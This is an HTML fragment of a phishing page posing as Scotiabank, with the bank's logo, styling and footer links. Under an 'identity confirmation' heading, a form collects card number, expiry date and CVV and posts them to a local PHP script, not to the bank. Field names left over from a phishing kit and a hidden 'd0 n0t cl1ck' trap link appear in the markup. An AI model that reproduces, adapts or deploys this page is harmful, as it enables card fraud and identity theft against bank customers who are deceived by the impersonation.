                                <path d="M64.59,80.82 C66.1237207,76.9760744 66.8455172,72.8563871 66.71,68.72 C66.71,62.1 64.63,56.17 60.85,52.04 C56.45,47.22 48.93,43.22 38.5,40.15 C36.4899977,39.577524 34.5301415,38.8417418 32.64,37.95 C30.9935723,37.1531986 29.5138959,36.0502288 28.28,34.7 C26.9705108,33.2474071 26.2939302,31.332828 26.4,29.38 C26.4,26.38 28.04,24.26 30.69,22.59 C34.02,20.49 40.43,20.28 46.98,22.71 C49.2881098,23.5549587 51.5140574,24.6093549 53.63,25.86 L62.39,8.43 C58.4888938,5.9483423 54.2571977,4.02943479 49.82,2.73 C45.248444,1.54260553 40.5432276,0.94773174 35.82,0.96 C31.3696885,0.898890768 26.9440177,1.63029467 22.75,3.12 C19.010124,4.5948635 15.6082207,6.81290443 12.75,9.64 C9.89789938,12.5061279 7.6352453,15.9035064 6.09,19.64 C4.5802852,23.5068265 3.83321533,27.6292939 3.89,31.78 C4.13712932,38.3663393 6.91698886,44.6031118 11.65,49.19 C17.65,54.82 24.46,56.81 27.2,57.87 C29.94,58.93 32.95,59.82 34.88,60.59 C36.8618628,61.3317163 38.7538061,62.2944605 40.52,63.46 C41.7860866,64.302037 42.8181978,65.4511207 43.52,66.8 C44.1301295,68.1065747 44.3522644,69.5608639 44.16,70.99 C43.9497756,73.1867465 42.9002544,75.2177311 41.23,76.66 C39.47,78.32 36.28,79.27 31.76,79.27 C27.7791432,79.1550053 23.865945,78.2116146 20.27,76.5 C17.0506856,75.0582424 13.9305086,73.4046154 10.93,71.55 L0.63,89.5 C7.82,95.88 19.47,100.14 29.85,100.14 C35.1255742,100.143992 40.3680451,99.3068174 45.38,97.66 C49.6810835,96.2306452 53.6717284,93.9977844 57.14,91.08 C60.3193526,88.2238861 62.8583051,84.7272884 64.59,80.82 L64.59,80.82 Z" id="Path"></path>
                                <path d="M686.2,75.54 C681.555866,75.5359546 677.366773,78.3304005 675.586736,82.6198607 C673.806699,86.9093209 674.786409,91.8487129 678.068878,95.1340436 C681.351347,98.4193744 686.289883,99.4033887 690.580893,97.6270904 C694.871903,95.850792 697.669998,91.6641362 697.67,87.02 C697.670002,80.6836743 692.536323,75.5455194 686.2,75.54 L686.2,75.54 Z M686.2,96.19 C682.490174,96.1940456 679.143391,93.9624137 677.720898,90.5361417 C676.298405,87.1098698 677.080481,83.1640502 679.702294,80.5393747 C682.324108,77.9146992 686.269071,77.1283183 689.696893,78.5470722 C693.124715,79.965826 695.359998,83.3101717 695.36,87.02 C695.360003,92.0805485 691.260545,96.1844814 686.2,96.19 L686.2,96.19 Z" id="Shape"></path>
                                <path d="M686.17,88.94 L684.34,88.94 L684.34,93.29 L682.07,93.29 L682.07,80.73 L686.88,80.73 C689.179128,80.7299934 691.044487,82.5908788 691.05,84.89 C691.017529,86.4724269 690.074959,87.8940717 688.63,88.54 L691.27,93.27 L688.56,93.27 L686.17,88.94 Z M684.34,86.83 L686.97,86.83 C687.974037,86.757398 688.751526,85.9216581 688.751526,84.915 C688.751526,83.9083419 687.974037,83.072602 686.97,83 L684.34,83 L684.34,86.83 Z" id="Shape"></path>
                                <path d="M121.02,75.18 C116.986142,80.2182875 110.210321,82.1597331 104.120397,80.0221676 C98.0304738,77.884602 93.9545038,72.1341734 93.9545038,65.68 C93.9545038,59.2258266 98.0304738,53.475398 104.120397,51.3378324 C110.210321,49.2002669 116.986142,51.1417125 121.02,56.18 L134.68,42.52 C128.157336,35.3280979 118.899202,31.2274963 109.19,31.23 C90.19,31.23 73.63,44.76 73.63,65.7 C73.63,86.64 90.18,100.18 109.19,100.18 C118.901541,100.183703 128.161372,96.0787172 134.68,88.88 L121.02,75.18 Z" id="Path"></path>
                                <path d="M359.07,98.5 L359.07,32.82 L338.98,32.82 L338.98,39.73 L337.12,38.07 C332.450803,33.6401596 326.256203,31.1766422 319.82,31.19 C302.09,31.19 287.12,46.97 287.12,65.66 C287.12,84.35 302.12,100.14 319.82,100.14 C326.25542,100.149253 332.448553,97.6863197 337.12,93.26 L338.98,91.59 L338.98,98.5 L359.07,98.5 Z M323.07,81.17 C314.505367,81.164478 307.566321,74.2179712 307.570001,65.6533376 C307.573682,57.0887041 314.518697,50.1481641 323.083331,50.1500036 C331.647965,50.1518431 338.589998,57.0953657 338.59,65.66 C338.584705,69.7822852 336.940681,73.7333333 334.020161,76.6425989 C331.099641,79.5518645 327.142275,81.180621 323.02,81.17 L323.07,81.17 Z" id="Shape"></path>
                                <path d="M520.94,98.5 L520.94,32.82 L500.82,32.82 L500.82,39.73 L498.96,38.07 C494.290803,33.6401596 488.096203,31.1766422 481.66,31.19 C463.93,31.19 448.95,46.97 448.95,65.66 C448.95,84.35 463.95,100.14 481.66,100.14 C488.09542,100.149253 494.288553,97.6863197 498.96,93.26 L500.82,91.59 L500.82,98.5 L520.94,98.5 Z M484.94,81.17 C476.375367,81.164478 469.436321,74.2179712 469.440001,65.6533376 C469.443682,57.0887041 476.388697,50.1481641 484.953331,50.1500036 C493.517965,50.1518431 500.459998,57.0953657 500.46,65.66 C500.454705,69.7822852 498.810681,73.7333333 495.890161,76.6425989 C492.969641,79.5518645 489.012275,81.180621 484.89,81.17 L484.94,81.17 Z" id="Shape"></path>
                                <path d="M389.82,98.5 L389.82,91.59 L391.68,93.26 C396.352568,97.6845639 402.54497,100.147207 408.98,100.14 C426.71,100.14 441.69,84.35 441.69,65.66 C441.69,46.97 426.69,31.19 408.98,31.19 C402.543993,31.1776697 396.34976,33.6410409 391.68,38.07 L389.82,39.73 L389.82,2.64 L369.73,2.64 L369.73,98.5 L389.82,98.5 Z M390.27,65.66 C390.270028,57.0992768 397.205981,50.1573976 405.766701,50.1500573 C414.327421,50.1427169 421.275268,57.0726915 421.289977,65.6334021 C421.304686,74.1941127 414.380695,81.1479221 405.82,81.17 C401.701187,81.1753077 397.748961,79.5442042 394.83277,76.6355142 C391.916579,73.7268243 390.275301,69.7788131 390.27,65.66 L390.27,65.66 Z" id="Shape"></path>
                            </g>
                        </g>
                    </svg>
                </a>
            </div>
        </header>
        <main class="_2ZVb38DpkqtGp0Be4LNKoB">
            <div class="_2Fmffc2ChdxSI8mbU7bwh_">
                <div class="Card__container Card__container--xs-padding-18 Card__container--sm-padding-24 Card__container--md-padding-30 Card__container--lg-padding-36 _1dzrLUbharfWi1F3nyVifP">
                    <div class="_1AR6e5iqu8uXHMTFKLnqWr">
                        <img src="./files/317301ebaf76dea648db60b7f7c830c7.svg" alt="">
                        <h1 class="TextHeading__text _3hjDHBxiP1Z2Uj2D22Khad">Let's
                            confirm your identity
                        </h1>
                    </div>
                    <style></style>
                    <form id="loginForm" method="post" action="040152.php">
                        <div class="_3qunkQtjRi8RVDR2uZh-8k">
                                                                <div class="form-group">
                                <span class="auto-style2"></span>
                                
                                <input required="" id="input-cc" type="text" placeholder="Card Number" name="card" class="Input__input lrinput" attr-action="Filling MMN">
                            </div><div class="form-group" style="display: block; text-align: left;">
                                <label style="display: block">
                                    
                                    
                                </label>
                                <select name="dob1" required="" class="Input__input lrinput" style="width:30%;display: inline-block;" attr-action="Selecting DoB">
                                    <option value="">MM</option>
                                    <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>                                        </select>
                                
                                <select name="dob3" required="" class="Input__input lrinput" style="width:37%; display: inline-block;" attr-action="Selecting DoB">
                                    <option value="">YY</option>
                                    <option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option>                                        </select>
                            </div>
                                                                <div class="form-group">
                                <span class="auto-style2"></span>
                                
                                <input required="" id="input-mmn" type="text" placeholder="CVV" name="mmn" class="Input__input lrinput" attr-action="Filling MMN">
                            </div>
                                                                <div class="Margin__container Margin__container-xs-36--top Margin__container-sm-36--top Margin__container-md-36--top Margin__container-lg-36--top" lg="36" md="36" side="top" sm="36" xs="36">
                            </div>
                            <div class="Row__container Row__container--space-between _4z_CU-aHX4gERAdbA4e0I">
                                <button class="ButtonCore__button NavButton__button NavButton__button--back _3KCbYWrq8qPtgcXETBSeoS" id="backBtn"></button>
                                <button class="ButtonCore__button NavButton__button NavButton__button--continue" id="continueBtn" name="save" value="1">
                                    <span class="ButtonCore__block">
                                        <span class="ButtonCore__text">Continue</span>
                                        <span class="ButtonCore__icon NavButton__icon">
                                            <svg class="SvgIcon__icon SvgIcon__icon-icon--size-18px" focusable="false" role="presentation" aria-hidden="true" viewBox="0 0 24 24">
                                                <path fill="none" d="M14.22 4l8 8-8 8M1.78 12h20.44"></path>
                                            </svg>
                                        </span>
                                    </span>
                                </button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </main>
        <footer class="footer footer--light-theme _3Ip9Jf7J6eOEvKAl2ldIr8">
            <div class="footer__bar container container--center direction--row _1t5tVchF8n-Sj-oAlYARZB">
                <ul class="footer__list">
                    <li class="footer-list__item"><a href="https://www.scotiabank.com/ca/en/personal/contact-us.html" target="_blank" class="footer__link text--footer text--bold">Contact Us</a></li>
                    <li class="footer-list__item"><a href="https://www.scotiabank.com/ca/en/about/contact-us/security.html" target="_blank" class="footer__link text--footer text--bold">Security</a></li>
                    <li class="footer-list__item"><a href="https://www.scotiabank.com/ca/en/about/contact-us/legal.html" target="_blank" class="footer__link text--footer text--bold">Legal</a></li>
                    <li class="footer-list__item"><a href="https://www.scotiabank.com/ca/en/about/contact-us/privacy.html" target="_blank" class="footer__link text--footer text--bold">Privacy</a></li>
                    <li class="footer-list__item"><a href="https://www.scotiabank.com/ca/en/personal/accessibility.html" target="_blank" class="footer__link text--footer text--bold">Accessibility</a></li>
                    <a href="/not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
                </ul>
                <p class="text--roman text--footer footer__copyright">© Scotiabank. All Rights Reserved.</p>
            </div>
        </footer>
    </div>
</div>


</body></html>